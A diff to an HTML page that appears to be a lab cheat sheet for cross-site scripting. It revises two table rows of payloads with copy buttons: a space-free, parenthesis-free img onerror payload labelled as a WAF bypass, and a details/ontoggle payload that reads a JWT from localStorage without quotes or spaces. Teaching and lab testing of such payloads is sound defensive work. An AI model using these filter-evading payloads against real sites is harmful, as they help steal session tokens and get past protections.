@@ -509,23 +509,23 @@
             <tr>
               <td>
                 <div class="code-copy-inline">
-                  <code>&lt;img/src=x/onerror=alert`1`&gt;</code>
-                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img/src=x/onerror=alert`1`>')">Copy</button>
+                  <code>&lt;img/src="x"/onerror=alert`1`&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img/src=&quot;x&quot;/onerror=alert`1`>')">Copy</button>
                 </div>
               </td>
               <td><strong>WAF bypass (no spaces, no parens)</strong></td>
-              <td>HTML5 treats <span class="flag-pill">/</span> between tag/attributes as whitespace; ES6 tagged template literals invoke functions using backticks <span class="flag-pill">`1`</span> instead of <code>(1)</code></td>
+              <td>HTML5 treats <span class="flag-pill">/</span> after a tag name or quoted attribute (<code>"x"/</code>) as whitespace; ES6 template literals call functions with <span class="flag-pill">`1`</span> instead of <code>(1)</code></td>
               <td><a href="./labs/lab04.html#parser-hacks" class="badge-lab-ref">Lab 04</a></td>
             </tr>
             <tr>
               <td>
                 <div class="code-copy-inline">
-                  <code>&lt;img/src=x/onerror=alert(localStorage.token)&gt;</code>
-                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<img/src=x/onerror=alert(localStorage.token)>')">Copy</button>
+                  <code>&lt;details/open/ontoggle=alert(localStorage.token)&gt;</code>
+                  <button type="button" class="terminal-copy-btn" onclick="navigator.clipboard.writeText('<details/open/ontoggle=alert(localStorage.token)>')">Copy</button>
                 </div>
               </td>
-              <td><strong>Quote-free token read</strong></td>
-              <td>Accesses <span class="flag-pill">localStorage.token</span> as an object property so you never need single or double quotes inside <code>.getItem('token')</code></td>
+              <td><strong>Quote-free + space-free token read</strong></td>
+              <td>Uses boolean <span class="flag-pill">open</span> (no quotes needed before <code>/</code>) and <span class="flag-pill">localStorage.token</span> dot-notation to read the JWT with zero quotes and zero spaces</td>
               <td><a href="./labs/lab04.html#parser-hacks" class="badge-lab-ref">Lab 04</a></td>
             </tr>
             <tr>
